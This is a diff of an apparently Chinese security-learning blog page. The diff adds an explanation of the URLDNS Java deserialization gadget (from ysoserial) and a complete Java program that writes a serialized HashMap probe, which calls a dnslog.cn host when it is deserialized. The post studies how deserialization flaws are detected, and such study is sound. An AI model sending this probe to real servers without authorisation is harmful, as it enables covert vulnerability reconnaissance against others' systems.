@@ -14,7 +14,7 @@
 <meta property="og:description" content="背景介绍学习一个探测java反序列化的利用链，不受限于jdk版本和第三方库，只要服务器出网即可。 代码分析由于调用链接非常简单，直接分析。探测的原理是如果反序列化时将触发URL类的DNS解析，根据DNSlog是否收到解析记录来判断目标是否存在反序列化漏洞。首先查看URL类的hashcode方法： 12345678910public final class URL implements java.i">
 <meta property="og:locale">
 <meta property="article:published_time" content="2021-07-10T07:12:26.000Z">
-<meta property="article:modified_time" content="2021-07-10T10:25:44.126Z">
+<meta property="article:modified_time" content="2021-07-10T13:13:26.713Z">
 <meta property="article:author" content="kirua">
 <meta property="article:tag" content="反序列化">
 <meta name="twitter:card" content="summary">
@@ -64,10 +64,10 @@
         
           <a id="nav-rss-link" class="nav-icon" href="../../../../atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Suche"></a>
       </nav>
       <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://kirualawliet.github.io/blog"></form>
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Suche"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://kirualawliet.github.io/blog"></form>
       </div>
     </div>
   </div>
@@ -119,13 +119,26 @@
 <ol>
 <li><p>仔细看上面贴的<code>URL</code>类的<code>hashCode</code>方法代码，可以看到如果<code>URL</code>对象的<code>hashCode</code>属性不等于<code>-1</code>，就不会走计算逻辑导致dns解析。所以可以在<code>URL</code>对象放进<code>HashMap</code>之前把<code>hashCode</code>修改为一个不为<code>-1</code>的数，就不会在构造探针的时候触发解析，然后为了在反序列化的时候触发，需要在放进<code>HashMap</code>之后，把<code>hashCode</code>属性重新修改回<code>-1</code>。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://test123.p71o49.dnslog.cn&quot;</span>);</span><br><span class="line">Field hashcode = URL.class.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">hashcode.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">hashcode.set(url, <span class="number">233</span>);</span><br><span class="line">HashMap hashmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">hashmap.put(url, <span class="string">&quot;&quot;</span>);</span><br><span class="line">hashcode.set(url, -<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li>
-<li></li>
+<li><p>查看<code>ysoserial</code>工具的<code>URLDNS</code>类实现：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ht;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到初始化<code>URL</code>的时候设置了<code>URL::handler</code>成员变量，由于<code>URL</code>类的<code>hashCode</code>方法实际调的是<code>URL::handler.hashCode</code>，后者如上面<code>URLStreamHandler::hashCode</code>方法的代码片段所示，会调用自己的<code>getHostAddress</code>方法。所以可以继承<code>URLStreamHandler</code>，复写<code>getHostAddress</code>方法，就不会导致后续调用<code>InetAddress.getByName</code>dns解析逻辑。又由于<code>URL::handler</code>是<code>transient</code>的属性，不会被序列化从而巧妙地在实现了构造阶段跳过dns解析。</p>
+</li>
 </ol>
+<h3 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h3><p>第一种方法的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sangfor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLProbe</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">generate_probe</span><span class="params">(String filePath)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://kirua.p71o49.dnslog.cn&quot;</span>);</span><br><span class="line">        Field hashcode = URL.class.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        hashcode.set(url, <span class="number">233</span>);</span><br><span class="line">        HashMap hashmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashmap.put(url, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        hashcode.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(filePath));</span><br><span class="line">        outputStream.writeObject(hashmap);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">trigger</span><span class="params">(String filePath)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(filePath));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String argv[])</span>  <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        URLProbe probe = <span class="keyword">new</span> URLProbe();</span><br><span class="line">        String filePath = <span class="string">&quot;./url_probe.dat&quot;</span>;</span><br><span class="line">        probe.generate_probe(filePath);</span><br><span class="line">        probe.trigger(filePath);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://kirualawliet.github.io/blog/2021/07/10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-URL%E6%8E%A2%E9%92%88/" data-id="ckqxrknuj00036cg57o3j7uvj" data-title="java反序列化学习-URL探针" class="article-share-link">Share</a>
+      <a data-url="https://kirualawliet.github.io/blog/2021/07/10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-URL%E6%8E%A2%E9%92%88/" data-id="ckqxrknuj00036cg57o3j7uvj" data-title="java反序列化学习-URL探针" class="article-share-link">Teilen</a>
       
       
       
@@ -138,7 +151,7 @@
 <nav id="article-nav">
   
     <a href="../xctf-pwn-welpwn-x86-64%E4%B9%8B%E4%B8%87%E8%83%BDROP/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
+      <strong class="article-nav-caption">Neuer</strong>
       <div class="article-nav-title">
         
           xctf-pwn welpwn x86_64之万能ROP
@@ -148,7 +161,7 @@
   
   
     <a href="../../07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-CC%E9%93%BE1/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
+      <strong class="article-nav-caption">Älter</strong>
       <div class="article-nav-title">java反序列化学习-CC链1</div>
     </a>
   
@@ -164,7 +177,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
+    <h3 class="widget-title">Kategorien</h3>
     <div class="widget">
       <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="../../../../categories/java/">java</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/pwn/">pwn</a></li></ul>
     </div>
@@ -176,7 +189,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/rop/" rel="tag">rop</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" rel="tag">二进制</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ROP/" rel="tag">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" rel="tag">二进制</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>
     </div>
   </div>
 
@@ -186,14 +199,14 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="../../../../tags/pwn/" style="font-size: 10px;">pwn</a> <a href="../../../../tags/rop/" style="font-size: 10px;">rop</a> <a href="../../../../tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" style="font-size: 10px;">二进制</a> <a href="../../../../tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 20px;">反序列化</a>
+      <a href="../../../../tags/ROP/" style="font-size: 10px;">ROP</a> <a href="../../../../tags/pwn/" style="font-size: 10px;">pwn</a> <a href="../../../../tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" style="font-size: 10px;">二进制</a> <a href="../../../../tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 20px;">反序列化</a>
     </div>
   </div>
 
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
+    <h3 class="widget-title">Archiv</h3>
     <div class="widget">
       <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/07/">July 2021</a></li></ul>
     </div>
@@ -203,7 +216,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
+    <h3 class="widget-title">letzter Beitrag</h3>
     <div class="widget">
       <ul>
         
